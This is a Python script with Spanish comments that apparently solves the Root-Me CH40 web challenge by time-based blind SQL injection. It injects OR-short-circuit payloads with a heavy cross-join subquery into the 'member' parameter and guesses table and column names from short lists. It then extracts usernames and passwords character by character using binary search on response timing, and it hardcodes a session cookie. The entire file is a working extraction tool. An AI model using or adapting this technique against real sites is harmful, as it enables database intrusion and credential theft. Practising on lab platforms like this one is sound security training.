#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 24 - ENCONTRAR LA TABLA CORRECTA
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        self.technique = "1 OR ({cond}) OR {heavy}"  # OR cortocircuito
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=2)
        return t > self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  ENCONTRANDO LA TABLA CORRECTA")
print("="*70)

# 1. Listar todas las tablas
print("\n[1] Listando todas las tablas:")

tablas = ['member', 'members', 'usuarios', 'users', 'admin', 'administradores', 'user', 'login', 'accounts']

tablas_encontradas = []
for tabla in tablas:
    if injector.is_true(f"EXISTS(SELECT * FROM {tabla})"):
        print(f"  [+] Tabla encontrada: {tabla}")
        tablas_encontradas.append(tabla)
    else:
        print(f"  [-] Tabla no encontrada: {tabla}")

print(f"\n  Tablas encontradas: {tablas_encontradas}")

# 2. Para cada tabla, listar columnas
print("\n[2] Listando columnas:")

for tabla in tablas_encontradas:
    print(f"\n  Tabla: {tabla}")
    
    columnas = ['id', 'user', 'username', 'login', 'name', 'password', 'pass', 'email', 'role']
    columnas_encontradas = []
    
    for col in columnas:
        if injector.is_true(f"EXISTS(SELECT {col} FROM {tabla})"):
            print(f"    [+] Columna encontrada: {col}")
            columnas_encontradas.append(col)
        else:
            print(f"    [-] Columna no encontrada: {col}")
    
    # 3. Extraer datos de la tabla
    if columnas_encontradas:
        print(f"\n    Extrayendo datos de {tabla}:")
        
        # Extraer los primeros 5 registros
        for i in range(1, 6):
            print(f"\n      Registro {i}:")
            
            for col in columnas_encontradas:
                if col in ['id', 'user', 'username', 'login', 'name', 'password', 'pass']:
                    query = f"SELECT {col} FROM {tabla} LIMIT 1 OFFSET {i-1}"
                    valor = injector.extract_string(query, f"        {col}")
                    print(f"        {col}: '{valor}'")
